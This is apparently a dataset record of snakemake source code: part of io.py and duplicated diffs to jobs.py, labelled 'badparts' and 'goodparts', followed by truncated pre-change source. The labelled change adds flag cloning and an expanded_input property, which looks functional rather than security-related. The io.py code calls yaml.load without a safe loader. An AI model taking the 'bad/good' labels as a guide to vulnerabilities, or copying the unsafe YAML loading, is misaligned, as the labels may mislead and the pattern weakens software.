\"\".join(f)\n\n\ndef apply_wildcards(pattern, wildcards,\n                    fill_missing=False,\n                    fail_dynamic=False,\n                    dynamic_fill=None,\n                    keep_dynamic=False):\n    def format_match(match):\n        name = match.group(\"name\")\n        try:\n            value = wildcards[name]\n            if fail_dynamic and value == dynamic_fill:\n                raise WildcardError(name)\n            return str(value)  # convert anything into a str\n        except KeyError as ex:\n            if keep_dynamic:\n                return \"{{{}}}\".format(name)\n            elif fill_missing:\n                return dynamic_fill\n            else:\n                raise WildcardError(str(ex))\n\n    return re.sub(_wildcard_regex, format_match, pattern)\n\n\ndef not_iterable(value):\n    return isinstance(value, str) or not isinstance(value, Iterable)\n\n\nclass AnnotatedString(str):\n    def __init__(self, value):\n        self.flags = dict()\n\n\ndef flag(value, flag_type, flag_value=True):\n    if isinstance(value, AnnotatedString):\n        value.flags[flag_type] = flag_value\n        return value\n    if not_iterable(value):\n        value = AnnotatedString(value)\n        value.flags[flag_type] = flag_value\n        return value\n    return [flag(v, flag_type, flag_value=flag_value) for v in value]\n\n\ndef is_flagged(value, flag):\n    if isinstance(value, AnnotatedString):\n        return flag in value.flags\n    return False\n\n\ndef temp(value):\n    \"\"\"\n    A flag for an input or output file that shall be removed after usage.\n    \"\"\"\n    if is_flagged(value, \"protected\"):\n        raise SyntaxError(\n            \"Protected and temporary flags are mutually exclusive.\")\n    return flag(value, \"temp\")\n\n\ndef temporary(value):\n    \"\"\" An alias for temp. \"\"\"\n    return temp(value)\n\n\ndef protected(value):\n    \"\"\" A flag for a file that shall be write protected after creation. \"\"\"\n    if is_flagged(value, \"temp\"):\n        raise SyntaxError(\n            \"Protected and temporary flags are mutually exclusive.\")\n    return flag(value, \"protected\")\n\n\ndef dynamic(value):\n    \"\"\"\n    A flag for a file that shall be dynamic, i.e. the multiplicity\n    (and wildcard values) will be expanded after a certain\n    rule has been run \"\"\"\n    annotated = flag(value, \"dynamic\")\n    tocheck = [annotated] if not_iterable(annotated) else annotated\n    for file in tocheck:\n        matches = list(_wildcard_regex.finditer(file))\n        #if len(matches) != 1:\n        #    raise SyntaxError(\"Dynamic files need exactly one wildcard.\")\n        for match in matches:\n            if match.group(\"constraint\"):\n                raise SyntaxError(\n                    \"The wildcards in dynamic files cannot be constrained.\")\n    return annotated\n\n\ndef touch(value):\n    return flag(value, \"touch\")\n\n\ndef expand(*args, **wildcards):\n    \"\"\"\n    Expand wildcards in given filepatterns.\n\n    Arguments\n    *args -- first arg: filepatterns as list or one single filepattern,\n        second arg (optional): a function to combine wildcard values\n        (itertools.product per default)\n    **wildcards -- the wildcards as keyword arguments\n        with their values as lists\n    \"\"\"\n    filepatterns = args[0]\n    if len(args) == 1:\n        combinator = product\n    elif len(args) == 2:\n        combinator = args[1]\n    if isinstance(filepatterns, str):\n        filepatterns = [filepatterns]\n\n    def flatten(wildcards):\n        for wildcard, values in wildcards.items():\n            if isinstance(values, str) or not isinstance(values, Iterable):\n                values = [values]\n            yield [(wildcard, value) for value in values]\n\n    try:\n        return [filepattern.format(**comb)\n                for comb in map(dict, combinator(*flatten(wildcards))) for\n                filepattern in filepatterns]\n    except KeyError as e:\n        raise WildcardError(\"No values given for wildcard {}.\".format(e))\n\n\ndef limit(pattern, **wildcards):\n    \"\"\"\n    Limit wildcards to the given values.\n\n    Arguments:\n    **wildcards -- the wildcards as keyword arguments\n                   with their values as lists\n    \"\"\"\n    return pattern.format(**{\n        wildcard: \"{{{},{}}}\".format(wildcard, \"|\".join(values))\n        for wildcard, values in wildcards.items()\n    })\n\n\ndef glob_wildcards(pattern):\n    \"\"\"\n    Glob the values of the wildcards by matching the given pattern to the filesystem.\n    Returns a named tuple with a list of values for each wildcard.\n    \"\"\"\n    pattern = os.path.normpath(pattern)\n    first_wildcard = re.search(\"{[^{]\", pattern)\n    dirname = os.path.dirname(pattern[:first_wildcard.start(\n    )]) if first_wildcard else os.path.dirname(pattern)\n    if not dirname:\n        dirname = \".\"\n\n    names = [match.group('name')\n             for match in _wildcard_regex.finditer(pattern)]\n    Wildcards = namedtuple(\"Wildcards\", names)\n    wildcards = Wildcards(*[list() for name in names])\n\n    pattern = re.compile(regex(pattern))\n    for dirpath, dirnames, filenames in os.walk(dirname):\n        for f in chain(filenames, dirnames):\n            if dirpath != \".\":\n                f = os.path.join(dirpath, f)\n            match = re.match(pattern, f)\n            if match:\n                for name, value in match.groupdict().items():\n                    getattr(wildcards, name).append(value)\n    return wildcards\n\n\n# TODO rewrite Namedlist!\nclass Namedlist(list):\n    \"\"\"\n    A list that additionally provides functions to name items. Further,\n    it is hashable, however the hash does not consider the item names.\n    \"\"\"\n\n    def __init__(self, toclone=None, fromdict=None, plainstr=False):\n        \"\"\"\n        Create the object.\n\n        Arguments\n        toclone  -- another Namedlist that shall be cloned\n        fromdict -- a dict that shall be converted to a\n            Namedlist (keys become names)\n        \"\"\"\n        list.__init__(self)\n        self._names = dict()\n\n        if toclone:\n            self.extend(map(str, toclone) if plainstr else toclone)\n            if isinstance(toclone, Namedlist):\n                self.take_names(toclone.get_names())\n        if fromdict:\n            for key, item in fromdict.items():\n                self.append(item)\n                self.add_name(key)\n\n    def add_name(self, name):\n        \"\"\"\n        Add a name to the last item.\n\n        Arguments\n        name -- a name\n        \"\"\"\n        self.set_name(name, len(self) - 1)\n\n    def set_name(self, name, index, end=None):\n        \"\"\"\n        Set the name of an item.\n\n        Arguments\n        name  -- a name\n        index -- the item index\n        \"\"\"\n        self._names[name] = (index, end)\n        if end is None:\n            setattr(self, name, self[index])\n        else:\n            setattr(self, name, Namedlist(toclone=self[index:end]))\n\n    def get_names(self):\n        \"\"\"\n        Get the defined names as (name, index) pairs.\n        \"\"\"\n        for name, index in self._names.items():\n            yield name, index\n\n    def take_names(self, names):\n        \"\"\"\n        Take over the given names.\n\n        Arguments\n        names -- the given names as (name, index) pairs\n        \"\"\"\n        for name, (i, j) in names:\n            self.set_name(name, i, end=j)\n\n    def items(self):\n        for name in self._names:\n            yield name, getattr(self, name)\n\n    def allitems(self):\n        next = 0\n        for name, index in sorted(self._names.items(),\n                                  key=lambda item: item[1][0]):\n            start, end = index\n            if end is None:\n                end = start + 1\n            if start > next:\n                for item in self[next:start]:\n                    yield None, item\n            yield name, getattr(self, name)\n            next = end\n        for item in self[next:]:\n            yield None, item\n\n    def insert_items(self, index, items):\n        self[index:index + 1] = items\n        add = len(items) - 1\n        for name, (i, j) in self._names.items():\n            if i > index:\n                self._names[name] = (i + add, j + add)\n            elif i == index:\n                self.set_name(name, i, end=i + len(items))\n\n    def keys(self):\n        return self._names\n\n    def plainstrings(self):\n        return self.__class__.__call__(toclone=self, plainstr=True)\n\n    def __getitem__(self, key):\n        try:\n            return super().__getitem__(key)\n        except TypeError:\n            pass\n        return getattr(self, key)\n\n    def __hash__(self):\n        return hash(tuple(self))\n\n    def __str__(self):\n        return \" \".join(map(str, self))\n\n\nclass InputFiles(Namedlist):\n    pass\n\n\nclass OutputFiles(Namedlist):\n    pass\n\n\nclass Wildcards(Namedlist):\n    pass\n\n\nclass Params(Namedlist):\n    pass\n\n\nclass Resources(Namedlist):\n    pass\n\n\nclass Log(Namedlist):\n    pass\n\n\ndef _load_configfile(configpath):\n    \"Tries to load a configfile first as JSON, then as YAML, into a dict.\"\n    try:\n        with open(configpath) as f:\n            try:\n                return json.load(f)\n            except ValueError:\n                f.seek(0)  # try again\n            try:\n                import yaml\n            except ImportError:\n                raise WorkflowError(\"Config file is not valid JSON and PyYAML \"\n                                    \"has not been installed. Please install \"\n                                    \"PyYAML to use YAML config files.\")\n            try:\n                return yaml.load(f)\n            except yaml.YAMLError:\n                raise WorkflowError(\"Config file is not valid JSON or YAML.\")\n    except FileNotFoundError:\n        raise WorkflowError(\"Config file {} not found.\".format(configpath))\n\n\ndef load_configfile(configpath):\n    \"Loads a JSON or YAML configfile as a dict, then checks that it's a dict.\"\n    config = _load_configfile(configpath)\n    if not isinstance(config, dict):\n        raise WorkflowError(\"Config file must be given as JSON or YAML \"\n                            \"with keys at top level.\")\n    return config\n\n##### Wildcard pumping detection #####\n\n\nclass PeriodicityDetector:\n    def __init__(self, min_repeat=50, max_repeat=100):\n        \"\"\"\n        Args:\n            max_len (int): The maximum length of the periodic substring.\n        \"\"\"\n        self.regex = re.compile(\n            \"((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$\".format(\n                min_repeat=min_repeat - 1,\n                max_repeat=max_repeat - 1))\n\n    def is_periodic(self, value):\n        \"\"\"Returns the periodic substring or None if not periodic.\"\"\"\n        m = self.regex.search(value)  # search for a periodic suffix.\n        if m is not None:\n            return m.group(\"value\")\n"},"\/snakemake\/jobs.py":{"changes":[{"diff":"\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n","add":1,"remove":1,"filename":"\/snakemake\/jobs.py","badparts":["from snakemake.io import IOFile, Wildcards, Resources, _IOFile"],"goodparts":["from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard"]},{"diff":"\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n","add":34,"remove":1,"filename":"\/snakemake\/jobs.py","badparts":["                    yield IOFile(f, self.rule)"],"goodparts":["                    fileToYield = IOFile(f, self.rule)","                    fileToYield.clone_flags(f_)","                    yield fileToYield","            else:","                yield f","    @property","    def expanded_input(self):","        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"","        for f, f_ in zip(self.input, self.rule.input):","            if not type(f_).__name__ == \"function\":","                if type(f_.file).__name__ not in [\"str\", \"function\"]:","                    if contains_wildcard(f_):","                        expansion = self.expand_dynamic(","                            f_,","                            restriction=self.wildcards,","                            omit_value=_IOFile.dynamic_fill)","                        if not expansion:","                            yield f_","                        for f, _ in expansion:","                            fileToYield = IOFile(f, self.rule)","                            fileToYield.clone_flags(f_)","                            yield fileToYield","                    else:","                        yield f","                else:","                    yield f"]},{"diff":"\n from functools import partial\n from operator import attrgetter\n \n-from snakemake.io import IOFile, Wildcards, Resources, _IOFile\n+from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard\n from snakemake.utils import format, listfiles\n from snakemake.exceptions import RuleException, ProtectedOutputException\n from snakemake.exceptions import UnexpectedOutputException\n","add":1,"remove":1,"filename":"\/snakemake\/jobs.py","badparts":["from snakemake.io import IOFile, Wildcards, Resources, _IOFile"],"goodparts":["from snakemake.io import IOFile, Wildcards, Resources, _IOFile, is_flagged, contains_wildcard"]},{"diff":"\n                 if not expansion:\n                     yield f_\n                 for f, _ in expansion:\n-                    yield IOFile(f, self.rule)\n+                    fileToYield = IOFile(f, self.rule)\n+\n+                    fileToYield.clone_flags(f_)\n+\n+                    yield fileToYield\n+            else:\n+                yield f\n+\n+    @property\n+    def expanded_input(self):\n+        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"\n+\n+        for f, f_ in zip(self.input, self.rule.input):\n+            if not type(f_).__name__ == \"function\":\n+                if type(f_.file).__name__ not in [\"str\", \"function\"]:\n+                    if contains_wildcard(f_):\n+\n+                        expansion = self.expand_dynamic(\n+                            f_,\n+                            restriction=self.wildcards,\n+                            omit_value=_IOFile.dynamic_fill)\n+                        if not expansion:\n+                            yield f_\n+                        for f, _ in expansion:\n+\n+                            fileToYield = IOFile(f, self.rule)\n+\n+                            fileToYield.clone_flags(f_)\n+\n+                            yield fileToYield\n+                    else:\n+                        yield f\n+                else:\n+                    yield f\n             else:\n                 yield f\n \n","add":34,"remove":1,"filename":"\/snakemake\/jobs.py","badparts":["                    yield IOFile(f, self.rule)"],"goodparts":["                    fileToYield = IOFile(f, self.rule)","                    fileToYield.clone_flags(f_)","                    yield fileToYield","            else:","                yield f","    @property","    def expanded_input(self):","        \"\"\" Iterate over input files while dynamic output is expanded. \"\"\"","        for f, f_ in zip(self.input, self.rule.input):","            if not type(f_).__name__ == \"function\":","                if type(f_.file).__name__ not in [\"str\", \"function\"]:","                    if contains_wildcard(f_):","                        expansion = self.expand_dynamic(","                            f_,","                            restriction=self.wildcards,","                            omit_value=_IOFile.dynamic_fill)","                        if not expansion:","                            yield f_","                        for f, _ in expansion:","                            fileToYield = IOFile(f, self.rule)","                            fileToYield.clone_flags(f_)","                            yield fileToYield","                    else:","                        yield f","                else:","                    yield f"]}],"source":"\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import sys import base64 import json from collections import defaultdict from itertools import chain from functools import partial from operator import attrgetter from snakemake.io import IOFile, Wildcards, Resources, _IOFile from snakemake.utils import format, listfiles from snakemake.exceptions import RuleException, ProtectedOutputException from snakemake.exceptions import UnexpectedOutputException from snakemake.logging import logger def jobfiles(jobs, type): return chain(*map(attrgetter(type), jobs)) class Job: HIGHEST_PRIORITY=sys.maxsize def __init__(self, rule, dag, targetfile=None, format_wildcards=None): self.rule=rule self.dag=dag self.targetfile=targetfile self.wildcards_dict=self.rule.get_wildcards(targetfile) self.wildcards=Wildcards(fromdict=self.wildcards_dict) self._format_wildcards=(self.wildcards if format_wildcards is None else Wildcards(fromdict=format_wildcards)) (self.input, self.output, self.params, self.log, self.benchmark, self.ruleio, self.dependencies)=rule.expand_wildcards(self.wildcards_dict) self.resources_dict={ name: min(self.rule.workflow.global_resources.get(name, res), res) for name, res in rule.resources.items() } self.threads=self.resources_dict[\"_cores\"] self.resources=Resources(fromdict=self.resources_dict) self._inputsize=None self.dynamic_output, self.dynamic_input=set(), set() self.temp_output, self.protected_output=set(), set() self.touch_output=set() self.subworkflow_input=dict() for f in self.output: f_=self.ruleio[f] if f_ in self.rule.dynamic_output: self.dynamic_output.add(f) if f_ in self.rule.temp_output: self.temp_output.add(f) if f_ in self.rule.protected_output: self.protected_output.add(f) if f_ in self.rule.touch_output: self.touch_output.add(f) for f in self.input: f_=self.ruleio[f] if f_ in self.rule.dynamic_input: self.dynamic_input.add(f) if f_ in self.rule.subworkflow_input: self.subworkflow_input[f]=self.rule.subworkflow_input[f_] self._hash=self.rule.__hash__() if True or not self.dynamic_output: for o in self.output: self._hash ^=o.__hash__() @property def priority(self): return self.dag.priority(self) @property def b64id(self): return base64.b64encode((self.rule.name +\"\".join(self.output) ).encode(\"utf-8\")).decode(\"utf-8\") @property def inputsize(self): \"\"\" Return the size of the input files. Input files need to be present. \"\"\" if self._inputsize is None: self._inputsize=sum(f.size for f in self.input) return self._inputsize @property def message(self): \"\"\" Return the message for this job. \"\"\" try: return(self.format_wildcards(self.rule.message) if self.rule.message else None) except AttributeError as ex: raise RuleException(str(ex), rule=self.rule) except KeyError as ex: raise RuleException(\"Unknown variable in message \" \"of shell command:{}\".format(str(ex)), rule=self.rule) @property def shellcmd(self): \"\"\" Return the shell command. \"\"\" try: return(self.format_wildcards(self.rule.shellcmd) if self.rule.shellcmd else None) except AttributeError as ex: raise RuleException(str(ex), rule=self.rule) except KeyError as ex: raise RuleException(\"Unknown variable when printing \" \"shell command:{}\".format(str(ex)), rule=self.rule) @property def expanded_output(self): \"\"\" Iterate over output files while dynamic output is expanded. \"\"\" for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: expansion=self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill) if not expansion: yield f_ for f, _ in expansion: yield IOFile(f, self.rule) else: yield f @property def dynamic_wildcards(self): \"\"\" Return all wildcard values determined from dynamic output. \"\"\" combinations=set() for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: for f, w in self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill): combinations.add(tuple(w.items())) wildcards=defaultdict(list) for combination in combinations: for name, value in combination: wildcards[name].append(value) return wildcards @property def missing_input(self): \"\"\" Return missing input files. \"\"\" return set(f for f in self.input if not f.exists and not f in self.subworkflow_input) @property def output_mintime(self): \"\"\" Return oldest output file. \"\"\" existing=[f.mtime for f in self.expanded_output if f.exists] if self.benchmark and self.benchmark.exists: existing.append(self.benchmark.mtime) if existing: return min(existing) return None @property def input_maxtime(self): \"\"\" Return newest input file. \"\"\" existing=[f.mtime for f in self.input if f.exists] if existing: return max(existing) return None def missing_output(self, requested=None): \"\"\" Return missing output files. \"\"\" files=set() if self.benchmark and(requested is None or self.benchmark in requested): if not self.benchmark.exists: files.add(self.benchmark) for f, f_ in zip(self.output, self.rule.output): if requested is None or f in requested: if f in self.dynamic_output: if not self.expand_dynamic( f_, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill): files.add(\"{}(dynamic)\".format(f_)) elif not f.exists: files.add(f) return files @property def existing_output(self): return filter(lambda f: f.exists, self.expanded_output) def check_protected_output(self): protected=list(filter(lambda f: f.protected, self.expanded_output)) if protected: raise ProtectedOutputException(self.rule, protected) def prepare(self): \"\"\" Prepare execution of job. This includes creation of directories and deletion of previously created dynamic files. \"\"\" self.check_protected_output() unexpected_output=self.dag.reason(self).missing_output.intersection( self.existing_output) if unexpected_output: logger.warning( \"Warning: the following output files of rule{} were not \" \"present when the DAG was created:\\n{}\".format( self.rule, unexpected_output)) if self.dynamic_output: for f, _ in chain(*map(partial(self.expand_dynamic, restriction=self.wildcards, omit_value=_IOFile.dynamic_fill), self.rule.dynamic_output)): os.remove(f) for f, f_ in zip(self.output, self.rule.output): f.prepare() for f in self.log: f.prepare() if self.benchmark: self.benchmark.prepare() def cleanup(self): \"\"\" Cleanup output files. \"\"\" to_remove=[f for f in self.expanded_output if f.exists] if to_remove: logger.info(\"Removing output files of failed job{}\" \" since they might be corrupted:\\n{}\".format( self, \", \".join(to_remove))) for f in to_remove: f.remove() def format_wildcards(self, string, **variables): \"\"\" Format a string with variables from the job. \"\"\" _variables=dict() _variables.update(self.rule.workflow.globals) _variables.update(dict(input=self.input, output=self.output, params=self.params, wildcards=self._format_wildcards, threads=self.threads, resources=self.resources, log=self.log, version=self.rule.version, rule=self.rule.name,)) _variables.update(variables) try: return format(string, **_variables) except NameError as ex: raise RuleException(\"NameError: \" +str(ex), rule=self.rule) except IndexError as ex: raise RuleException(\"IndexError: \" +str(ex), rule=self.rule) def properties(self, omit_resources=\"_cores _nodes\".split()): resources={ name: res for name, res in self.resources.items() if name not in omit_resources } params={name: value for name, value in self.params.items()} properties={ \"rule\": self.rule.name, \"local\": self.dag.workflow.is_local(self.rule), \"input\": self.input, \"output\": self.output, \"params\": params, \"threads\": self.threads, \"resources\": resources } return properties def json(self): return json.dumps(self.properties()) def __repr__(self): return self.rule.name def __eq__(self, other): if other is None: return False return self.rule==other.rule and( self.dynamic_output or self.wildcards_dict==other.wildcards_dict) def __lt__(self, other): return self.rule.__lt__(other.rule) def __gt__(self, other): return self.rule.__gt__(other.rule) def __hash__(self): return self._hash @staticmethod def expand_dynamic(pattern, restriction=None, omit_value=None): \"\"\" Expand dynamic files. \"\"\" return list(listfiles(pattern, restriction=restriction, omit_value=omit_value)) class Reason: def __init__(self): self.updated_input=set() self.updated_input_run=set() self.missing_output=set() self.incomplete_output=set() self.forced=False self.noio=False self.nooutput=False self.derived=True def __str__(self): s=list() if self.forced: s.append(\"Forced execution\") else: if self.noio: s.append(\"Rules with neither input nor \" \"output files are always executed.\") elif self.nooutput: s.append(\"Rules with a run or shell declaration but no output \" \"are always executed.\") else: if self.missing_output: s.append(\"Missing output files:{}\".format( \", \".join(self.missing_output))) if self.incomplete_output: s.append(\"Incomplete output files:{}\".format( \", \".join(self.incomplete_output))) updated_input=self.updated_input -self.updated_input_run if updated_input: s.append(\"Updated input files:{}\".format( \", \".join(updated_input))) if self.updated_input_run: s.append(\"Input files updated by another job:{}\".format( \", \".join(self.updated_input_run))) s=\"; \".join(s) return s def __bool__(self): return bool(self.updated_input or self.missing_output or self.forced or self.updated_input_run or self.noio or self.nooutput) ","sourceWithComments":"__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport sys\nimport base64\nimport json\n\nfrom collections import defaultdict\nfrom itertools import chain\nfrom functools import partial\nfrom operator import attrgetter\n\nfrom snakemake.io import IOFile, Wildcards, Resources, _IOFile\nfrom snakemake.utils import format, listfiles\nfrom snakemake.exceptions import RuleException, ProtectedOutputException\nfrom snakemake.exceptions import UnexpectedOutputException\nfrom snakemake.logging import logger\n\n\ndef jobfiles(jobs, type):\n    return chain(*map(attrgetter(type), jobs))\n\n\nclass Job:\n    HIGHEST_PRIORITY = sys.maxsize\n\n    def __init__(self, rule, dag, targetfile=None, format_wildcards=None):\n        self.rule = rule\n        self.dag = dag\n        self.targetfile = targetfile\n\n        self.wildcards_dict = self.rule.get_wildcards(targetfile)\n        self.wildcards = Wildcards(fromdict=self.wildcards_dict)\n        self._format_wildcards = (self.wildcards if format_wildcards is None\n                                  else Wildcards(fromdict=format_wildcards))\n\n        (self.input, self.output, self.params, self.log, self.benchmark,\n         self.ruleio,\n         self.dependencies) = rule.expand_wildcards(self.wildcards_dict)\n\n        self.resources_dict = {\n            name: min(self.rule.workflow.global_resources.get(name, res), res)\n            for name, res in rule.resources.items()\n        }\n        self.threads = self.resources_dict[\"_cores\"]\n        self.resources = Resources(fromdict=self.resources_dict)\n        self._inputsize = None\n\n        self.dynamic_output, self.dynamic_input = set(), set()\n        self.temp_output, self.protected_output = set(), set()\n        self.touch_output = set()\n        self.subworkflow_input = dict()\n        for f in self.output:\n            f_ = self.ruleio[f]\n            if f_ in self.rule.dynamic_output:\n                self.dynamic_output.add(f)\n            if f_ in self.rule.temp_output:\n                self.temp_output.add(f)\n            if f_ in self.rule.protected_output:\n                self.protected_output.add(f)\n            if f_ in self.rule.touch_output:\n                self.touch_output.add(f)\n        for f in self.input:\n            f_ = self.ruleio[f]\n            if f_ in self.rule.dynamic_input:\n                self.dynamic_input.add(f)\n            if f_ in self.rule.subworkflow_input:\n                self.subworkflow_input[f] = self.rule.subworkflow_input[f_]\n        self._hash = self.rule.__hash__()\n        if True or not self.dynamic_output:\n            for o in self.output:\n                self._hash ^= o.__hash__()\n\n    @property\n    def priority(self):\n        return self.dag.priority(self)\n\n    @property\n    def b64id(self):\n        return base64.b64encode((self.rule.name + \"\".join(self.output)\n                                 ).encode(\"utf-8\")).decode(\"utf-8\")\n\n    @property\n    def inputsize(self):\n        \"\"\"\n        Return the size of the input files.\n        Input files need to be present.\n        \"\"\"\n        if self._inputsize is None:\n            self._inputsize = sum(f.size for f in self.input)\n        return self._inputsize\n\n    @property\n    def message(self):\n        \"\"\" Return the message for this job. \"\"\"\n        try:\n            return (self.format_wildcards(self.rule.message) if\n                    self.rule.message else None)\n        except AttributeError as ex:\n            raise RuleException(str(ex), rule=self.rule)\n        except KeyError as ex:\n            raise RuleException(\"Unknown variable in message \"\n                                \"of shell command: {}\".format(str(ex)),\n                                rule=self.rule)\n\n    @property\n    def shellcmd(self):\n        \"\"\" Return the shell command. \"\"\"\n        try:\n            return (self.format_wildcards(self.rule.shellcmd) if\n                    self.rule.shellcmd else None)\n        except AttributeError as ex:\n            raise RuleException(str(ex), rule=self.rule)\n        except KeyError as ex:\n            raise RuleException(\"Unknown variable when printing \"\n                                \"shell command: {}\".format(str(ex)),\n                                rule=self.rule)\n\n    @property\n    def expanded_output(self):\n        \"\"\" Iterate over output files while dynamic output is expanded. \"\"\"\n        for f, f_ in zip(self.output, self.rule.output):\n            if f in self.dynamic_output:\n                expansion = self.expand_dynamic(\n                    f_,\n                    restriction=self.wildcards,\n                    omit_value=_IOFile.dynamic_fill)\n                if not expansion:\n                    yield f_\n                for f, _ in expansion:\n                    yield IOFile(f, self.rule)\n            else:\n                yield f\n\n    @property\n    def dynamic_wildcards(self):\n        \"\"\" Return all wildcard values determined from dynamic output. \"\"\"\n        combinations = set()\n        for f, f_ in zip(self.output, self.rule.output):\n            if f in self.dynamic_output:\n                for f, w in self.expand_dynamic(\n                    f_,\n                    restriction=self.wildcards,\n                    omit_value=_IOFile.dynamic_fill):\n                    combinations.add(tuple(w.items()))\n        wildcards = defaultdict(list)\n        for combination in combinations:\n            for name, value in combination:\n                wildcards[name].append(value)\n        return wildcards\n\n    @property\n    def missing_input(self):\n        \"\"\" Return missing input files. \"\"\"\n        # omit file if it comes from a subworkflow\n        return set(f for f in self.input\n                   if not f.exists and not f in self.subworkflow_input)\n\n    @property\n    def output_mintime(self):\n        \"\"\" Return oldest output file. \"\"\"\n        existing = [f.mtime for f in self.expanded_output if f.exists]\n        if self.benchmark and self.benchmark.exists:\n            existing.append(self.benchmark.mtime)\n        if existing:\n            return min(existing)\n        return None\n\n    @property\n    def input_maxtime(self):\n        \"\"\" Return newest input file. \"\"\"\n        existing = [f.mtime for f in self.input if f.exists]\n        if existing:\n            return max(existing)\n        return None\n\n    def missing_output(self, requested=None):\n        \"\"\" Return missing output files. \"\"\"\n        files = set()\n        if self.benchmark and (requested is None or\n                               self.benchmark in requested):\n            if not self.benchmark.exists:\n                files.add(self.benchmark)\n\n        for f, f_ in zip(self.output, self.rule.output):\n            if requested is None or f in requested:\n                if f in self.dynamic_output:\n                    if not self.expand_dynamic(\n                        f_,\n                        restriction=self.wildcards,\n                        omit_value=_IOFile.dynamic_fill):\n                        files.add(\"{} (dynamic)\".format(f_))\n                elif not f.exists:\n                    files.add(f)\n        return files\n\n    @property\n    def existing_output(self):\n        return filter(lambda f: f.exists, self.expanded_output)\n\n    def check_protected_output(self):\n        protected = list(filter(lambda f: f.protected, self.expanded_output))\n        if protected:\n            raise ProtectedOutputException(self.rule, protected)\n\n    def prepare(self):\n        \"\"\"\n        Prepare execution of job.\n        This includes creation of directories and deletion of previously\n        created dynamic files.\n        \"\"\"\n\n        self.check_protected_output()\n\n        unexpected_output = self.dag.reason(self).missing_output.intersection(\n            self.existing_output)\n        if unexpected_output:\n            logger.warning(\n                \"Warning: the following output files of rule {} were not \"\n                \"present when the DAG was created:\\n{}\".format(\n                    self.rule, unexpected_output))\n\n        if self.dynamic_output:\n            for f, _ in chain(*map(partial(self.expand_dynamic,\n                                           restriction=self.wildcards,\n                                           omit_value=_IOFile.dynamic_fill),\n                                   self.rule.dynamic_output)):\n                os.remove(f)\n        for f, f_ in zip(self.output, self.rule.output):\n            f.prepare()\n        for f in self.log:\n            f.prepare()\n        if self.benchmark:\n            self.benchmark.prepare()\n\n    def cleanup(self):\n        \"\"\" Cleanup output files. \"\"\"\n        to_remove = [f for f in self.expanded_output if f.exists]\n        if to_remove:\n            logger.info(\"Removing output files of failed job {}\"\n                        \" since they might be corrupted:\\n{}\".format(\n                            self, \", \".join(to_remove)))\n            for f in to_remove:\n                f.remove()\n\n    def format_wildcards(self, string, **variables):\n        \"\"\" Format a string with variables from the job. \"\"\"\n        _variables = dict()\n        _variables.update(self.rule.workflow.globals)\n        _variables.update(dict(input=self.input,\n                               output=self.output,\n                               params=self.params,\n                               wildcards=self._format_wildcards,\n                               threads=self.threads,\n                               resources=self.resources,\n                               log=self.log,\n                               version=self.rule.version,\n                               rule=self.rule.name, ))\n        _variables.update(variables)\n        try:\n            return format(string, **_variables)\n        except NameError as ex:\n            raise RuleException(\"NameError: \" + str(ex), rule=self.rule)\n        except IndexError as ex:\n            raise RuleException(\"IndexError: \" + str(ex), rule=self.rule)\n\n    def properties(self, omit_resources=\"_cores _nodes\".split()):\n        resources = {\n            name: res\n            for name, res in self.resources.items()\n            if name not in omit_resources\n        }\n        params = {name: value for name, value in self.params.items()}\n        properties = {\n            \"rule\": self.rule.name,\n            \"local\": self.dag.workflow.is_local(self.rule),\n            \"input\": self.input,\n            \"output\": self.output,\n            \"params\": params,\n            \"threads\": self.threads,\n            \"resources\": resources\n        }\n        return properties\n\n    def json(self):\n        return json.dumps(self.properties())\n\n    def __repr__(self):\n        return self.rule.name\n\n    def __eq__(self, other):\n        if other is None:\n            return False\n        return self.rule == other.rule and (\n            self.dynamic_output or self.wildcards_dict == other.wildcards_dict)\n\n    def __lt__(self, other):\n        return self.rule.__lt__(other.rule)\n\n    def __gt__(self, other):\n        return self.rule.__gt__(other.rule)\n\n    def __hash__(self):\n        return self._hash\n\n    @staticmethod\n    def expand_dynamic(pattern, restriction=None, omit_value=None):\n        \"\"\" Expand dynamic files. \"\"\"\n        return list(listfiles(pattern,\n                              restriction=restriction,\n                              omit_value=omit_value))\n\n\nclass Reason:\n    def __init__(self):\n        self.updated_input = set()\n        self.updated_input_run = set()\n        self.missing_output = set()\n        self.incomplete_output = set()\n        self.forced = False\n        self.noio = False\n        self.nooutput = False\n        self.derived = True\n\n    def __str__(self):\n        s = list()\n        if 